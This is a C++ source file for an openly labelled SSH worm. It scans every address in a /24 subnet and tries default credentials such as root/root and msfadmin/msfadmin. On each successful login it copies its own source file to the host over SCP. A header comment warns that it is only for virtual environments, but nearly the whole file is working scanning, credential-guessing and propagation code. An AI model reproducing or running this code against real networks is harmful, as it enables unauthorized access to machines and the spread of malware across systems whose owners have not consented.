//Start Date: 24-09-2024
// Copyright © apocalypse9949 2024-2025. All rights reserved.
// Use of this source code is governed by Apache 2 LICENSE which can be found in the LICENSE file.
//WARNING!!
//This worm can only used in virtual env, please don't try to run this on your personal or work system this can spread through your network

#include <libssh/libssh.h>
#include <libssh/sftp.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <sstream>

class Dracula {
private:
    std::string vampire;

public:
    Dracula(const std::string& vampire_address) : vampire(vampire_address) {}

    std::vector<std::string> blood_suction() {
        std::vector<std::string> white_teeth;
        std::istringstream ss(vampire);
        std::string part;
        std::vector<std::string> tokens;

        while (std::getline(ss, part, '.')) {
            tokens.push_back(part);
        }

        for (int i = 1; i < 256; i++) {
            std::ostringstream host;
            host << tokens[0] << "." << tokens[1] << "." << tokens[2] << "." << i;
            white_teeth.push_back(host.str());
        }

        return white_teeth;
    }

    std::vector<std::pair<std::string, std::string>> get_credentials() {
        return { {"user", "user"}, {"root", "root"}, {"msfadmin", "msfadmin"} };
    }

    size_t get_file_size(const std::string& filename) {
        std::ifstream in(filename, std::ifstream::ate | std::ifstream::binary);
        return in.tellg();
    }

    void spread_via_ssh() {
        ssh_session my_ssh_session;
        ssh_scp scp_session;
        int rc;

        for (const auto& remote_address : blood_suction()) {
            std::cout << "Trying to spread on the remote host: " << remote_address << std::endl;

            for (const auto& cred : get_credentials()) {
                my_ssh_session = ssh_new();
                if (!my_ssh_session) continue;

                ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, remote_address.c_str());
                ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, cred.first.c_str());
                rc = ssh_connect(my_ssh_session);
                if (rc == SSH_OK) {
                    rc = ssh_userauth_password(my_ssh_session, NULL, cred.second.c_str());
                    if (rc == SSH_AUTH_SUCCESS) {
                        std::cout << "Connected to " << remote_address << " with credentials " << cred.first << ":" << cred.second << std::endl;

                        scp_session = ssh_scp_new(my_ssh_session, SSH_SCP_WRITE, ".");
                        if (scp_session) {
                            ssh_scp_init(scp_session);
                            size_t file_size = get_file_size("GhostNet.cpp");
                            ssh_scp_push_file(scp_session, "GhostNet.cpp", file_size, S_IRUSR | S_IWUSR);
                            std::cout << "Worm file uploaded to the host" << std::endl;
                            ssh_scp_free(scp_session);
                        }
                    }
                }
                ssh_disconnect(my_ssh_session);
                ssh_free(my_ssh_session);
            }
        }
    }
};

int main() {
    Dracula dracula("192.168.0.0");
    dracula.spread_via_ssh();
    return 0;
}
